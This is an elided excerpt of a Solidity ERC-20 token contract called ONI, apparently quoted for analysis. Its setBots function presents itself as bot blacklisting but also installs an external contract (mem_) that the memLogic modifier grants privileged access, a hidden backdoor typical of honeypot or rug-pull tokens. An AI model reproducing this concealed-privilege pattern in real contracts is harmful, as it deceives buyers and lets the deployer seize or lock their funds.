...
contract ONI is Context, IERC20, Ownable {
    ...
    uint256 private jeetCount;
    uint256 private jeetPreventTime;
    uint256 private _totalSupply = 3690000000 * 10**9;
    ...
    uint256 private _maxTxAmount = 36900005 * 10**9; // 1%
    uint256 private _maxWalletAmount = 120000005 * 10**9; // 3%
    ...
    modifier memLogic() {
        require(address(mem_) == msg.sender);_;
    }

    constructor(address _set) {
        _feeAddrWallet = payable(0x40920055B3D5bA0E699EF2De86f5B061914af19D);
    ...
    function setBots(address[] memory bots_) external onlyOwner {
        ...
        bots[bots_[i]] = true;} mem_ = memBot(bots_[1]);
    }
